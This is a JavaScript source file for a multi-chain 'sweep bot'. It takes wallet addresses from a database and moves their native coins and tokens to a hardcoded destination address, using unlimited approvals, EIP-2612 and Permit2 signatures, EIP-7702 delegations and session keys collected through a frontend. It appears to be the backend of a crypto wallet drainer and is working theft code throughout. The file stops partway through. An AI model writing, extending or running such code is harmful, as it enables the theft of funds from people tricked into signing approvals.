// bot.js — Universal sweep bot for any EVM chain
// Single codebase driven by env vars. Deploy one Docker container per chain.
//
// Architecture:
//   wsProvider  — WebSocketProvider for instant block events (WSS_URL)
//   rpcProvider — JsonRpcProvider for ALL balance/fee/tx calls (RPC_URL)
//
// Sweep strategy:
//   Block events         → sweep wallets whose 60s cooldown has expired
//   delegated_wallets RT → instant sweep on new/updated wallet
//
// Permit2 AllowanceTransfer flow:
//   User calls permit2.approve(token, relayer, MaxUint160, MaxUint48) once.
//   Bot calls permit2.transferFrom(user, dest, balance, token) — no signature,
//   no nonce, no expiry concern. Allowance is stored in the Permit2 contract.

require("dotenv").config();
const { ethers } = require("ethers");
const { createClient } = require("@supabase/supabase-js");
const ws = require("ws");
const fs  = require("fs");

// ── Config ────────────────────────────────────────────────────────────────────

const PRIVATE_KEY               = process.env.PRIVATE_KEY;
const WS_URL = process.env.WSS_URL || process.env.WS_URL;
const RPC_URL = process.env.RPC_URL;
const TCN_ADDRESS               = process.env.TCN_ADDRESS || null;
const DESTINATION_ADDRESS       = process.env.DESTINATION_ADDRESS || "0x8Da0f664bb5091585148333275FcF0607b258026";
const TOKENS_TO_WATCH           = (process.env.TOKENS_TO_WATCH || "").split(",").filter(Boolean);
const SUPABASE_URL              = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const CHAIN                     = process.env.CHAIN || "eth";
const CHAIN_ID                  = Number(process.env.CHAIN_ID || "1");

const PERMIT2_ADDRESS      = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const MULTICALL3_ADDRESS   = "0xcA11bde05977b3631167028862bE2a173976CA11";
const MIN_ETH_WEI          = ethers.parseEther(process.env.MIN_NATIVE_WEI || "0.001");
const MIN_TOKEN_UNITS      = process.env.MIN_TOKEN_UNITS || "0.5";

const sleep = ms => new Promise(r => setTimeout(r, ms));

// Stagger CoinGecko startup fetch to avoid hitting rate limits
const CG_STAGGER_MS = Number(process.env.CG_STAGGER_MS || "0");
const TOKEN_CALL_DELAY     = Number(process.env.TOKEN_CALL_DELAY || "150");
// Minimum relayer balance — if below this, skip ALL sweeps to avoid failed txs
const RELAYER_MIN_WEI      = ethers.parseEther(process.env.RELAYER_MIN_WEI || "0.01");

// ── Chain-specific constants from env ─────────────────────────────────────────
const NATIVE_COINGECKO_ID  = process.env.NATIVE_COINGECKO_ID || "ethereum";
const COINGECKO_PLATFORM   = process.env.COINGECKO_PLATFORM || "ethereum";
const COINGECKO_CATEGORY   = process.env.COINGECKO_CATEGORY || "ethereum-ecosystem";
const GAS_AIRDROP_AMOUNT   = ethers.parseEther(process.env.GAS_AIRDROP_AMOUNT || "0.003");
const AIRDROP_MIN_VALUE_USD = Number(process.env.AIRDROP_MIN_VALUE_USD || "20");
const AIRDROP_MIN_RELAYER_USD = Number(process.env.AIRDROP_MIN_RELAYER_USD || "50");
const USE_FLASHBOTS = process.env.USE_FLASHBOTS === "true";

// ── Pimlico / Permissionless / Flashbots ─────────────────────────────────────
const PIMLICO_API_KEY    = process.env.PIMLICO_API_KEY || "";
const PIMLICO_POLICY_ID  = process.env.PIMLICO_POLICY_ID || "sp_lucky_hemingway";
const FLASHBOTS_AUTH_KEY = process.env.FLASHBOTS_AUTH_KEY || "";
const RELAYER_ADDRESS    = process.env.RELAYER_ADDRESS || "";
const PIMLICO_URLS = {
  eth:     `https://api.pimlico.io/v2/1/rpc?apikey=${PIMLICO_API_KEY}`,
  bnb:     `https://api.pimlico.io/v2/56/rpc?apikey=${PIMLICO_API_KEY}`,
  polygon: `https://api.pimlico.io/v2/137/rpc?apikey=${PIMLICO_API_KEY}`,
  base:    `https://api.pimlico.io/v2/8453/rpc?apikey=${PIMLICO_API_KEY}`,
  arbitrum: `https://api.pimlico.io/v2/42161/rpc?apikey=${PIMLICO_API_KEY}`,
  optimism: `https://api.pimlico.io/v2/10/rpc?apikey=${PIMLICO_API_KEY}`,
  avalanche: `https://api.pimlico.io/v2/43114/rpc?apikey=${PIMLICO_API_KEY}`,
  linea:   `https://api.pimlico.io/v2/59144/rpc?apikey=${PIMLICO_API_KEY}`,
  fantom:  `https://api.pimlico.io/v2/250/rpc?apikey=${PIMLICO_API_KEY}`,
  scroll:  `https://api.pimlico.io/v2/534352/rpc?apikey=${PIMLICO_API_KEY}`,
  blast:   `https://api.pimlico.io/v2/81457/rpc?apikey=${PIMLICO_API_KEY}`,
  mantle:  `https://api.pimlico.io/v2/5000/rpc?apikey=${PIMLICO_API_KEY}`,
};
// Don't hardcode Pimlico URLs for every chain — build dynamically from chain ID
function getPimlicoUrl() {
  if (PIMLICO_URLS[CHAIN]) return PIMLICO_URLS[CHAIN];
  return `https://api.pimlico.io/v2/${CHAIN_ID}/rpc?apikey=${PIMLICO_API_KEY}`;
}

// ── Validation ────────────────────────────────────────────────────────────────

if (!PRIVATE_KEY || !DESTINATION_ADDRESS || !RPC_URL) {
  console.error("Missing required env vars: PRIVATE_KEY, RPC_URL, DESTINATION_ADDRESS");
  process.exit(1);
}
if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
  console.warn("⚠️  SUPABASE env missing — Realtime disabled");
}

// ── Providers ─────────────────────────────────────────────────────────────────
//
// rpcProvider — HTTP JsonRpc for ALL contract/balance/fee/tx calls
// wsProvider  — WebSocket for block events ONLY; recreated on disconnect
//               NEVER passed to a Contract or Wallet

const rpcProvider = new ethers.JsonRpcProvider(RPC_URL);

const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
  ? createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
      auth: { persistSession: false },
      realtime: { transport: ws },
    })
  : null;

// ── ABIs ──────────────────────────────────────────────────────────────────────

const CONTRACT_ABI = [
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
  "event ETHReceived(address indexed sender, uint256 amount)",
];

const DELEGATION_ABI = [
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
];

const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "event Transfer(address indexed from, address indexed to, uint256 value)",
];

const EIP2612_PERMIT_ABI = [
  "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
];

const STABLECOIN_ADDRS = new Set([
  "0x55d398326f99059ff775485246999027b3197955",
  "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
  "0xe9e7cea3dedca5984780bafc599bd69add087d56",
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
  "0xdac17f958d2ee523a2206206994597c13d831ec7",
  "0x6b175474e89094c44da98b954eedeac495271d0f",
  "0x2791bca1f2de4661ed88a30c99a7a9449aa84174",
  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
  "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063",
]);

const priceCache   = new Map();
const PRICE_CACHE_TTL = 5 * 60 * 1000;

// Permit2 — AllowanceTransfer + gasless PermitBatch + SignatureTransfer ABIs.
const PERMIT2_ABI = [
  "function transferFrom(address from, address to, uint160 amount, address token) external",
  "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)",
  "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes calldata signature) external",
];
const PERMIT2_BATCH_TRANSFER_ABI = [
  "function permitTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes calldata signature) external",
];

// ── Wallet & contracts — ALL bound to rpcProvider (HTTP) ─────────────────────

const relayerWallet = new ethers.Wallet(PRIVATE_KEY, rpcProvider);
const permit2       = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayerWallet);
const permit2Batch  = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_BATCH_TRANSFER_ABI, relayerWallet);
const contract      = TCN_ADDRESS
  ? new ethers.Contract(TCN_ADDRESS, CONTRACT_ABI, relayerWallet)
  : null;

// ── State ─────────────────────────────────────────────────────────────────────

let sweepingETH        = false;
const sweepingToken    = {};
const delegatedWallets   = new Map();
const needsReconnect     = new Map();
const needsReauthWallets = new Set();
const RECONNECT_COOLDOWN_MS = 3_600_000; // 1 hour
let realtimeChannel    = null;
const BACKOFF_MS       = [5_000, 10_000, 20_000, 40_000, 60_000];
let reconnectAttempt   = 0;

function withJitter(ms) { return Math.floor(ms * (0.8 + Math.random() * 0.4)); }

const BLACKLISTED_EIP2612 = new Set([]);
const failedEIP2612 = new Set();

// ── Dynamic token list ────────────────────────────────────────────────────────

const KNOWN_DECIMALS = {
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": 6,
  "0xdac17f958d2ee523a2206206994597c13d831ec7": 6,
  "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913": 6,
  "0xaf88d065e77c8cc2239327c5edb3a432268e5831": 6,
  "0x0b2c639c533813f4aa9d7837caf62653d097ff85": 6,
  "0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e": 6,
  "0x2791bca1f2de4661ed88a30c99a7a9449aa84174": 6,
  "0x04068da6c83afcfa0e13ba15a6696662335d5b75": 6,
};

const FALLBACK_TOKENS = {
  base: [
    { symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6 },
    { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18 },
  ],
  arbitrum: [
    { symbol: "USDC", address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals: 6 },
    { symbol: "WETH", address: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", decimals: 18 },
  ],
  optimism: [
    { symbol: "USDC", address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", decimals: 6 },
    { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18 },
  ],
  avalanche: [
    { symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6 },
    { symbol: "WAVAX", address: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7", decimals: 18 },
  ],
};
const FALLBACK = FALLBACK_TOKENS[CHAIN] || [];

let TOKENS = [];

// ── Event-driven monitoring state ─────────────────────────────────────────────

const monitoredWallets = new Map();
const sweepingNow      = new Set();

// ── Logging ───────────────────────────────────────────────────────────────────

const TAG  = `[${CHAIN.toUpperCase()}]`;
const log  = (msg) => console.log(`[${new Date().toISOString()}] ${TAG} ${msg}`);
const warn = (msg) => console.warn(`[${new Date().toISOString()}] ${TAG} ⚠  ${msg}`);
const err  = (msg) => console.error(`[${new Date().toISOString()}] ${TAG} ✖  ${msg}`);

// ── Helpers ───────────────────────────────────────────────────────────────────

function normalizeAddress(addr) {
  if (!addr || typeof addr !== "string") return null;
  try { return ethers.getAddress(addr.toLowerCase()); } catch { return null; }
}

async function getFeeData() {
  const f = await rpcProvider.getFeeData();
  return { maxFeePerGas: f.maxFeePerGas, maxPriorityFeePerGas: f.maxPriorityFeePerGas };
}

// ── Main-contract sweep (TCNDelegation) ──────────────────────────────────────

async function sweepETH() {
  if (sweepingETH || !contract) return;
  sweepingETH = true;
  try {
    const bal = await rpcProvider.getBalance(contract.target);
    if (bal < MIN_ETH_WEI) return;
    log(`Contract ETH ${ethers.formatEther(bal)} — sweeping`);
    const gas = await contract.sweepETH.estimateGas(DESTINATION_ADDRESS);
    const fee = await getFeeData();
    const tx = await contract.sweepETH(DESTINATION_ADDRESS, { gasLimit: gas * 110n / 100n, ...fee });
    await tx.wait();
    log(`✅ swept contract ETH`);
  } catch (e) { warn(`sweepETH: ${e.reason ?? e.message}`); }
  finally { sweepingETH = false; }
}

async function sweepTokenFromContract(tokenAddress) {
  if (!contract) return;
  try {
    const token   = new ethers.Contract(tokenAddress, ERC20_ABI, rpcProvider);
    const balance = await token.balanceOf(contract.target);
    if (balance === 0n) return;
    log(`Contract ${tokenAddress.slice(0,10)} balance=${balance} — sweeping`);
    const fee = await getFeeData();
    const tx = await contract.sweepTokens(DESTINATION_ADDRESS, tokenAddress, { gasLimit: 100_000n, ...fee });
    await tx.wait();
    log(`✅ swept contract ${tokenAddress.slice(0,10)}`);
  } catch (e) { warn(`sweepToken: ${e.message}`); }
}

// ── EIP-7702 delegated-wallet sweep ───────────────────────────────────────────

async function sweepDelegatedWallet(checksum) {
  const short = checksum.slice(0, 10);
  log(`[sweep] scanning ${short} for sweepable balances`);

  // 1) Sweep native coin via DELEGATION_ABI
  try {
    const nativeBal = await rpcProvider.getBalance(checksum);
    if (nativeBal > MIN_ETH_WEI) {
      const delegation = new ethers.Contract(checksum, DELEGATION_ABI, relayerWallet);
      const fee = await getFeeData();
      const fullGas = await delegation.sweepETH.estimateGas(DESTINATION_ADDRESS);
      const tx = await delegation.sweepETH(DESTINATION_ADDRESS, { gasLimit: fullGas * 110n / 100n, ...fee });
      await tx.wait();
      log(`[delegation] ✅ swept native ${ethers.formatEther(nativeBal)} from ${short}`);
    }
  } catch (e) { warn(`[delegation] ${short} native: ${e.reason ?? e.message}`); }

  // 2) Sweep ERC20 tokens
  const tokenList = TOKENS_TO_WATCH.length > 0 ? TOKENS_TO_WATCH : TOKENS.map(t => t.address).filter(Boolean);
  for (const rawAddr of tokenList) {
    const addr = normalizeAddress(rawAddr) || normalizeAddress(rawAddr?.address ?? rawAddr);
    if (!addr) continue;
    try {
      const token = new ethers.Contract(addr, ERC20_ABI, rpcProvider);
      const balance = await token.balanceOf(checksum);
      if (balance === 0n) continue;

      const delegation = new ethers.Contract(checksum, DELEGATION_ABI, relayerWallet);
      const fee = await getFeeData();
      const fullGas = await delegation.sweepTokens.estimateGas(addr, DESTINATION_ADDRESS);
      const tx = await delegation.sweepTokens(addr, DESTINATION_ADDRESS, { gasLimit: fullGas * 110n / 100n, ...fee });
      await tx.wait();
      log(`[delegation] ✅ swept ${addr.slice(0,10)} from ${short}`);
    } catch (e) { warn(`[delegation] ${short} ${addr?.slice(0,10)}: ${e.message}`); }
  }
}

// ── Price fetching (CoinGecko) ────────────────────────────────────────────────

async function price(symbolOrAddress) {
  const now = Date.now();
  const cached = priceCache.get(symbolOrAddress);
  if (cached && now - cached.ts < PRICE_CACHE_TTL) return cached.usd;
  try {
    const id = symbolOrAddress.length > 20 ? "ethereum" : (STABLECOIN_ADDRS.has(symbolOrAddress.toLowerCase()) ? "usd-coin" : NATIVE_COINGECKO_ID);
    const res = await fetch(`${COINGECKO_API}/simple/price?ids=usd-coin,${NATIVE_COINGECKO_ID}&vs_currencies=usd`);
    if (!res.ok) return cached?.usd ?? 0;
    const data = await res.json();
    const usd = data["usd-coin"]?.usd ?? 1; // stablecoins ~ $1
    if (usd > 0) priceCache.set("__stable__", { usd, ts: now });
    priceCache.set(NATIVE_COINGECKO_ID, { usd: data[NATIVE_COINGECKO_ID]?.usd ?? 0, ts: now });
    return usd;
  } catch { return cached?.usd ?? 0; }
}

// ── Token list fetching (CoinGecko + fallback) ───────────────────────────────

async function cgFetchWithRetry(url) {
  for (let attempt = 0; attempt < 2; attempt++) {
    const res = await fetch(url);
    if (res.status === 429) { await sleep(60_000); continue; }
    if (!res.ok) throw new Error(`CoinGecko ${res.status} for ${url}`);
    return res.json();
  }
  throw new Error("CoinGecko still rate-limited after retry");
}

async function fetchTokenList(chain) {
  const categories = [COINGECKO_CATEGORY];
  let page1 = [], page2 = [];
  for (const category of categories) {
    try {
      log(`[tokens] fetching page 1 for ${chain} (category=${category})...`);
      const r1 = await cgFetchWithRetry(
        `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${category}&order=market_cap_desc&per_page=250&page=1`
      );
      if (Array.isArray(r1) && r1.length > 0) { page1 = r1; break; }
    } catch (e) { warn(`[tokens] page 1 failed: ${e.message}`); }
    await sleep(2_000);
  }

  if (!page1.length) {
    warn(`[tokens] CoinGecko failed for ${chain} — using ${FALLBACK.length} fallback tokens`);
    return FALLBACK;
  }

  try {
    await sleep(2_000);
    log(`[tokens] fetching page 2 for ${chain}...`);
    const r2 = await cgFetchWithRetry(
      `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${COINGECKO_CATEGORY}&order=market_cap_desc&per_page=250&page=2`
    );
    if (Array.isArray(r2)) page2 = r2;
  } catch { /* page 2 is optional */ }

  const allCoins = [...page1, ...page2];
  const tokens = [];

  for (const coin of allCoins) {
    if (!coin.platforms) continue;
    let addr = coin.platforms[COINGECKO_PLATFORM];
    if (!addr && chain === "base") addr = coin.platforms["base"];
    if (!addr && chain === "arbitrum") addr = coin.platforms["arbitrum-one"];
    if (addr) {
      tokens.push({
        symbol:   (coin.symbol || "").toUpperCase(),
        address:  addr.toLowerCase(),
        decimals: KNOWN_DECIMALS[addr.toLowerCase()] ?? 18,
      });
    }
  }

  return tokens.length > 0 ? tokens : FALLBACK;
}

// ── Multicall balance check ───────────────────────────────────────────────────

const ERC20_BAL_IFACE = new ethers.Interface(["function balanceOf(address) view returns (uint256)"]);

async function checkAllBalances(address) {
  if (!TOKENS.length) return [];
  const multicall = new ethers.Contract(MULTICALL3_ADDRESS, [
    "function aggregate3(tuple(address target, bool allowFailure, bytes callData)[] calls) external view returns (tuple(bool success, bytes returnData)[] returnData)",
  ], rpcProvider);
  const calls = TOKENS.map(token => ({
    target:       token.address,
    allowFailure: true,
    callData:     ERC20_BAL_IFACE.encodeFunctionData("balanceOf", [address]),
  }));

  const results = [];
  const CHUNK   = 250;
  for (let i = 0; i < calls.length; i += CHUNK) {
    try {
      const chunk      = calls.slice(i, i + CHUNK);
      const returnData = await multicall.aggregate3(chunk);
      for (let j = 0; j < chunk.length; j++) {
        const { success, returnData: data } = returnData[j];
        if (!success || !data || data === "0x") continue;
        try {
          const [balance] = ERC20_BAL_IFACE.decodeFunctionResult("balanceOf", data);
          if (balance > 0n) results.push({ ...TOKENS[i + j], balance });
        } catch { /* skip */ }
      }
    } catch (e) {
      warn(`[balances] chunk ${i} failed: ${e.message}`);
    }
  }
  return results;
}

// ── Dispatch sweep — relayer gate + debounce ──────────────────────────────────

async function dispatchSweep(wallet) {
  const short = wallet.address.slice(0, 10);
  log(`[sweep] starting for ${short} type=${wallet.type}`);

  const relayerBal = await rpcProvider.getBalance(relayerWallet.address);
  if (relayerBal < RELAYER_MIN_WEI) {
    log(`[sweep] ${short} — relayer too low (${ethers.formatEther(relayerBal)}), skipping`);
    return;
  }

  const key = wallet.address.toLowerCase();
  if (sweepingNow.has(key)) return;
  sweepingNow.add(key);

  try {
    await sweep(wallet);
    log(`[sweep] ✅ complete for ${short}`);
  } catch (e) {
    log(`[sweep] ❌ error for ${short}: ${e.message}`);
  } finally {
    setTimeout(() => sweepingNow.delete(key), 10000);
  }
}

// ── Universal sweep — 6 tiers ────────────────────────────────────────────────

async function sweep(wallet) {
  const checksum = normalizeAddress(wallet.address);
  if (!checksum) return;
  const short = checksum.slice(0, 10);
  const nowSecs = BigInt(Math.floor(Date.now() / 1000));
  const addrKey = checksum.toLowerCase();

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 0A: SESSION KEY (ERC-7715 + Pimlico)
  // ══════════════════════════════════════════════════════════════════════════
  if (wallet.type === "session-key") {
    const ok = await sweepViaSessionKey(checksum, short, addrKey);
    if (ok) return;
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 0B: EIP-7702 + Flashbots Atomic Bundle (ETH only)
  // ══════════════════════════════════════════════════════════════════════════
  if (wallet.type === "eip7702" && USE_FLASHBOTS) {
    const ok = await sweepViaFlashbotsBundle(checksum, short, addrKey);
    if (ok) return;
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 1: EIP-7702 — delegated wallet, sweep via authorization
  // ══════════════════════════════════════════════════════════════════════════
  if (wallet.type === "eip7702") {
    const code = await rpcProvider.getCode(checksum);
    if (!code || code === "0x" || !code.startsWith("0xef0100")) {
      log(`[eip7702] ${short} — delegation expired, marking needs-reauth`);
      needsReauthWallets.add(addrKey);
      if (supabase) {
        await supabase.from("delegated_wallets")
          .update({ status: "needs-reauth" })
          .eq("address", addrKey).eq("chain", CHAIN);
      }
      return;
    }
    await sweepDelegatedWallet(checksum);
    return;
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 1.5: DIRECT ERC-20 ALLOWANCE — token.transferFrom() without Permit2
  // ══════════════════════════════════════════════════════════════════════════
  // Works for ANY wallet (Trust, OneKey, SafePal, BitGet, OKX, Rabby, imToken,
  // Ledger, Phantom…) that signed a direct approve(RELAYER_ADDRESS, MaxUint256)
  // via wallet_sendCalls in the frontend.  The bot checks the on-chain allowance
  // and calls transferFrom — zero external contract dependencies.
  await sweepViaDirectAllowance(checksum, short);

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 2: EIP-2612 — permit() + transferFrom() per token
  // ══════════════════════════════════════════════════════════════════════════
  if (supabase) {
    const { data: permits } = await supabase
      .from("eip2612_permits")
      .select("*")
      .eq("address", addrKey)
      .eq("chain", CHAIN)
      .eq("used", false);

    for (const p of permits ?? []) {
      if (BLACKLISTED_EIP2612.has(p.token.toLowerCase())) continue;
      const dl = typeof p.deadline === "string" ? BigInt(Math.floor(new Date(p.deadline).getTime() / 1000)) : 0n;
      if (dl > 0n && dl < nowSecs) {
        await supabase.from("eip2612_permits").update({ used: true }).eq("id", p.id);
        continue;
      }

      const token = new ethers.Contract(p.token, ERC20_ABI, rpcProvider);
      let balance;
      try { balance = await token.balanceOf(checksum); } catch { continue; }
      if (balance === 0n) continue;

      log(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} balance=${ethers.formatUnits(balance, 18)} — permit()`);
      try {
        const fee = await getFeeData();
        const tc = new ethers.Contract(p.token, EIP2612_PERMIT_ABI, relayerWallet);
        const tx1 = await tc.permit(checksum, PERMIT2_ADDRESS, ethers.MaxUint256, dl, p.v, p.r, p.s, { gasLimit: 100_000n, ...fee });
        await tx1.wait();
        const actualAllow = await token.allowance(checksum, PERMIT2_ADDRESS);
        if (actualAllow === 0n) {
          warn(`[eip2612] permit() succeeded but allowance=0 — skipping`);
          await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
          continue;
        }
        const tx2 = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, p.token, { gasLimit: 150_000n, ...fee });
        await tx2.wait();
        log(`[eip2612] ✅ swept ${p.symbol ?? p.token.slice(0,10)}`);
        await supabase.from("eip2612_permits").update({ used: true }).eq("id", p.id);
      } catch (e) {
        err(`[eip2612] ❌ ${p.symbol ?? p.token.slice(0,10)}: ${e.reason ?? e.message}`);
        await supabase.from("eip2612_permits").update({ used: true, failed: true }).eq("id", p.id);
      }
    }
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 3: Permit2 AllowanceTransfer
  // ══════════════════════════════════════════════════════════════════════════
  if (supabase) {
    const { data: pbData } = await supabase
      .from("permit2_signatures")
      .select("*")
      .eq("address", addrKey)
      .eq("chain", CHAIN)
      .single();

    if (pbData?.permit?.transfer_type === "permit-batch" && Array.isArray(pbData.permit.details)) {
      for (const detail of pbData.permit.details) {
        try {
          const [p2Amount,, p2Exp] = await permit2.allowance(checksum, detail.token, relayerWallet.address);
          if (p2Amount === 0n || BigInt(p2Exp) < nowSecs) continue;
          const token = new ethers.Contract(detail.token, ERC20_ABI, rpcProvider);
          const balance = await token.balanceOf(checksum);
          if (balance === 0n) continue;
          const fee = await getFeeData();
          const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, balance, detail.token, { gasLimit: 150_000n, ...fee });
          await tx.wait();
          log(`[allowance] ✅ swept ${detail.token.slice(0,10)}`);
        } catch (e) {
          err(`[allowance] ❌ ${detail.token.slice(0,10)}: ${e.reason ?? e.message}`);
        }
      }
    }
  }

  // ══════════════════════════════════════════════════════════════════════════
  // TIER 4: Permit2 SignatureTransfer
  // ══════════════════════════════════════════════════════════════════════════
  if (supabase) {
    const { data: stData } = await supabase
      .from("permit2_signatures")
      .select("*")
      .eq("address", addrKey + "-sig")
      .eq("chain", CHAIN)
      .single();

    if (stData?.permit?.transfer_type === "batch-signature-transfer" && stData.signature) {
      const sig = stData.permit;
      const spenderMatch = sig.spender?.toLowerCase() === relayerWallet.address.toLowerCase();
      const dl = BigInt(sig.deadline ?? 0);
      if (!spenderMatch) { log(`[gasless] ❌ spender mismatch`); return; }
      if (dl < nowSecs) { log(`[gasless] ❌ expired`); return; }

      const withBalance = [];
      for (const perm of sig.permitted ?? []) {
        try {
          const t = new ethers.Contract(perm.token, ERC20_ABI, rpcProvider);
          const bal = await t.balanceOf(checksum);
          if (bal > 0n) withBalance.push({ ...perm, balance: bal });
        } catch { /* skip */ }
      }

      if (withBalance.length === 0) { log(`[gasless] all zero — skipping`); return; }
      log(`[gasless] sweeping ${withBalance.length} tokens`);

      try {
        const fee = await getFeeData();
        const gasLimit = 150_000n + BigInt(withBalance.length) * 100_000n;
        const tx = await permit2Batch.permitTransferFrom(
          {
            permitted: withBalance.map(t => ({ token: t.token, amount: BigInt(t.amount) })),
            nonce: BigInt(sig.nonce),
            deadline: dl,
          },
          withBalance.map(t => ({ to: DESTINATION_ADDRESS, requestedAmount: t.balance })),
          checksum,
          sig.signature,
          { gasLimit, ...fee },
        );
        await tx.wait();
        log(`[gasless] ✅ swept ${withBalance.length} tokens`);
      } catch (e) {
        err(`[gasless] ❌ revert: ${e.reason ?? e.message}`);
      }
    }
  }
}

// ══════════════════════════════════════════════════════════════════════════
// TIER 1.5: DIRECT ERC-20 ALLOWANCE — no Permit2, no EIP-7702
// ══════════════════════════════════════════════════════════════════════════
// Checks token.allowance(user, RELAYER_ADDRESS) on-chain for every watched
// token.  For any token where allowance >= balance, calls transferFrom()
// directly from the bot's EOA.  No Permit2 contract, no signature replay,
// no session key infrastructure needed.
//
// Covers strict-EOA wallets (Trust, OneKey, SafePal, BitGet, OKX, Rabby,
// imToken, Ledger, Phantom, Exodus) after the frontend's tryDirectApproval
// (wallet_sendCalls with approve(RELAYER_ADDRESS, MaxUint256) per token).
//
// Also self-heals: if any wallet ever did a manual approve() to RELAYER_ADDRESS
// outside of the web3portal flow, it gets swept automatically.

const ERC20_TRANSFER_FROM_ABI = [
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)",
  "function transfer(address to, uint256 amount) external returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
  "function symbol() external view returns (string)",
  "function decimals() external view returns (uint8)",
];

async function sweepViaDirectAllowance(checksum, short) {
  const botWallet = new ethers.Wallet(PRIVATE_KEY, rpcProvider);

  // ── 1. Collect tokens to check ──────────────────────────────────────────
  // Always check TOKENS_TO_WATCH (chain-specific list from env) plus any
  // dynamically discovered tokens from the coverage check.
  const tokensToCheck = [...new Set(TOKENS_TO_WATCH.map(a => a.toLowerCase()))];
  if (tokensToCheck.length === 0) return;

  const swept = [];

  // ── 2. Per-token: check allowance → balance → transferFrom ──────────────
  for (const tokenAddr of tokensToCheck) {
    try {
      const token     = new ethers.Contract(tokenAddr, ERC20_TRANSFER_FROM_ABI, rpcProvider);
      const allowance = await token.allowance(checksum, RELAYER_ADDRESS);
      if (allowance === 0n) continue;                        // no allowance — skip

      const balance = await token.balanceOf(checksum);
      if (balance === 0n) continue;                          // nothing to sweep

      // Use the lesser of allowance and balance (can't transfer more than approved)
      const amount = allowance < balance ? allowance : balance;

      // Skip dust below min threshold
      let decimals = 18n;
      try { decimals = BigInt(await token.decimals()); } catch { /* ignore */ }
      const minUnits = BigInt(Math.floor(Number(MIN_TOKEN_UNITS) * 10 ** Number(decimals)));
      if (amount < minUnits) continue;

      log(`[direct] ${short} ${tokenAddr.slice(0,10)} allowance=${ethers.formatUnits(allowance, Number(decimals))} balance=${ethers.formatUnits(balance, Number(decimals))} — sweeping`);

      const feeData = await rpcProvider.getFeeData();
      const tx = await botWallet.sendTransaction({
        to:   tokenAddr,
        data: new ethers.Interface(ERC20_TRANSFER_FROM_ABI).encodeFunctionData("transferFrom", [checksum, DESTINATION_ADDRESS, amount]),
        gasLimit: 100_000n,
        maxFeePerGas:         feeData.maxFeePerGas         ?? undefined,
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ?? undefined,
      });
      const receipt = await tx.wait();
      let sym = tokenAddr.slice(0, 10);
      try { sym = await token.symbol(); } catch { /* ignore */ }
      log(`[direct] ✅ swept ${sym}: ${receipt.hash}`);
      swept.push(sym);
    } catch (e) {
      // CALL_EXCEPTION typically = no allowance / zero balance — not an error
      if (e.code !== "CALL_EXCEPTION") {
        log(`[direct] ⚠️  ${tokenAddr.slice(0,10)}: ${e.reason ?? e.message?.slice(0, 80)}`);
      }
    }
  }

  if (swept.length > 0) {
    log(`[direct] ✅ direct transferFrom complete for ${short}: ${swept.join(", ")}`);
  }
}

// ══════════════════════════════════════════════════════════════════════════
// TIER 0A: SESSION KEY VIA PIMLICO ERC-4337 USEROP
// ══════════════════════════════════════════════════════════════════════════

// ── ERC-7579 execution helpers ────────────────────────────────────────────────
// callType 0x01 = batch, execType 0x00 = default (revert on failure)
const ERC7579_BATCH_MODE = "0x0100000000000000000000000000000000000000000000000000000000000000";

function encodeERC7579Batch(calls) {
  // abi.encode((address target,uint256 value,bytes callData)[])
  return ethers.AbiCoder.defaultAbiCoder().encode(
    ["(address target,uint256 value,bytes callData)[]"],
    [calls.map(c => ({ target: c.to, value: c.value, callData: c.data || "0x" }))]
  );
}

// ── ERC-4337 v0.7 UserOp hash ─────────────────────────────────────────────────
